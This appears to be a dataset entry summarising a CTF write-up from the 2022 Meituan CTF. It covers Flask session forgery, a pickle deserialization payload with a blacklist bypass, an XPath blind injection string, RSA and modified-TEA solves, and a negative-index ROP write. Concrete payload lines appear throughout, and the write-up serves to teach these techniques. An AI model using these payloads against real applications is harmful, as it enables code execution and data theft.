---
title: 第五届2022美团CTF-WriteUp By EDISEC
contest: 美团CTF
year: 2022
difficulty: medium
vuln_type: web_unknown
tags: [Web-Pickle反序列化,Flask-Session伪造,大小写绕,Java-XXE,XPATH盲注,Crypto-RSA,魔改TEA,Pwn-数组越界]
attack_chain: easypickle: flask-unsign爆破SECRET_KEY(os.urandom(2).hex仅16^4空间)→伪造session user=admin→构造pickle payload (cos system S'whoami' os.)→大小写替换b"builtin"→b"BuIltIn"/b"os"→b"Os"/b"bytes"→b"Bytes"绕黑名单→base64编码session.ser_data|babyjava: XXE+XPATH盲注xpath=x' or substring((/root/user[1]/username[2]),§10§,1)='§T§' and ''='|strange_rsa1: gmpy2.invert(e,s)解RSA p q e|re_1 small: 魔改TEA delta=0x67452301*35+|note: libc-2.31 PWN+数组越界
key_payload: flask-unsign -u -c "eyJ1c2VyIjoibmlpbWQifQ.YyWuLQ.0cA5d6Yw0YLgq2_-ONSmWixQO0o" --wordlist /test/1.txt --no-literal-eval|b'''(cOs system S'whoami' Os.'''|xpath=x' or substring((/root/user[1]/username[2]),§10§,1)='§T§' and ''='|tt=[0xDE087143,0xC4F91BD2,0xDAF6DADC,0x6D9ED54C,0x75EB4EE7,0x5D1DDC04,0x511B0FD9,0x51DC88FB] key=[0x1,0x23,0x45,0x67] decrypt|edit(-4, p64(0) + p64(0x000000000040101a) + p64(pop_ret) + p64(binsh) + p64(sys))|flag{24af657f-a24a-4bf9-9b9c-a5c76dfd5e54}
one_liner: 4道题Web/Crypto/Re/Pwn全覆盖:easypickle(flask-unsign+pickle大小写替换绕黑名单)+babyjava(XXE+XPATH substring逐位爆)+strange_rsa1(标准RSA)+re_1 small(魔改TEA delta=0x67452301)+note(libc-2.31数组越界+负idx写got)
lesson: 1) flask SECRET_KEY=os.urandom(2).hex()实际仅4字符16^4=65536空间,flask-unsign爆破秒出; 2) Pickle反序列化黑名单b'builtin'/'os'/'bytes'/'R'/'i'/'o'/'b'可通过大小写替换绕过(b'BuIltIn'→还原后等于'builtin'); 3) Java XXE+XPATH盲注 substring((/root/user[1]/username[2]),pos,1)='T' 逐位爆; 4) 魔改TEA delta可从0x9E3779B9改成其他值(如0x67452301),IDA反编译识别delta; 5) PWN数组越界用负idx(如edit(-4))写函数返回地址为ret+prdi+binsh+system
quality: high
---

## 备注

原文(https://www.ctfiot.com/57488.html)EDI招新广告(招re/crypto/pwn/misc方向)后接4题WP。

### 题目清单(4题)

**01 Web-easypickle**
- Flask app:`SECRET_KEY=os.urandom(2).hex()` → 4字符hex(65536空间)
- `/admin`路由要求`session.get('user') == "admin"`且`pickle.loads(base64.b64decode(session.get('ser_data')))`无异常
- 源码做大小写替换:`a = base64.b64decode(...).replace(b"builtin", b"BuIltIn").replace(b"os", b"Os").replace(b"bytes", b"Bytes")`
- 黑名单:`b'R' or b'i' or b'o' or b'b'`
- flask-unsign爆破SECRET_KEY → 伪造session
- pickle payload:`(cos system S'whoami' os.` → 替换为`(cOs system S'whoami' Os.`

**01 Web-babyjava**
- XXE + XPATH盲注
- POST /hello xpath=x' or substring((/root/user[1]/username[2]),§10§,1)='§T§' and ''='
- Burp Intruder爆破字符位

**02 Crypto-strange_rsa1**
- p,q,e标准RSA,long_to_bytes
- 关键代码:`gmpy2.invert(e, s)`解d,`pow(c, d, n)`解m

**03 Re-re_1 : small**
- 魔改TEA(35轮),delta=0x67452301
- 4组2个uint32加密,key=[0x1, 0x23, 0x45, 0x67]
- 密文8个uint32:tt=[0xDE087143, 0xC4F91BD2, 0xDAF6DADC, 0x6D9ED54C, 0x75EB4EE7, 0x5D1DDC04, 0x511B0FD9, 0x51DC88FB]
- 解密结果long_to_bytes后[::-1]反转拼flag

**04 Pwn-note**
- libc-2.31,9次add(0x100)+8次free+add(0x80, 'deadbeef')+show(0)泄libc
- 关键:`edit(-4, p64(0) + p64(0x000000000040101a) + p64(pop_ret) + p64(binsh) + p64(sys))`
- 负idx数组越界写返回地址为ret+pop_ret+prdi(binsh)+system
- flag{24af657f-a24a-4bf9-9b9c-a5c76dfd5e54}

## 评级

- **quality: high** — 4题全链完整,flask-unsign爆破脚本+pickle大小写绕+XXE XPATH爆破+TEA魔改+数组越界,典型CTF多方向合集
- **vuln_type: web_unknown** — 混合赛,主分类Web;实际涉及deserialize、xss(Java XXE)、crypto_rsa(标准解)、block_cipher(魔改TEA)、pwn_unknown(数组越界)
- 末尾EDI招新招re/crypto/pwn/misc方向
